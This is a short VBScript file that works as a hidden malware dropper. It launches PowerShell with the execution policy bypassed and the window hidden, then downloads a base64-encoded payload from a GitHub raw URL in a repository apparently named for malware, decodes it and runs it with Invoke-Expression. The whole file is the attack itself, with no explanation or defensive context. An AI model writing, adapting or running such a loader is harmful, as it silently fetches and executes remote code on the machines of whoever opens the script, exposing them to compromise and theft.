Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$b=[Net.WebClient]::new().DownloadString('https://raw.githubusercontent.com/CyberXProgrammer/ashbanmalvir/main/encoded.txt');$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b));Invoke-Expression $s""", 0, False
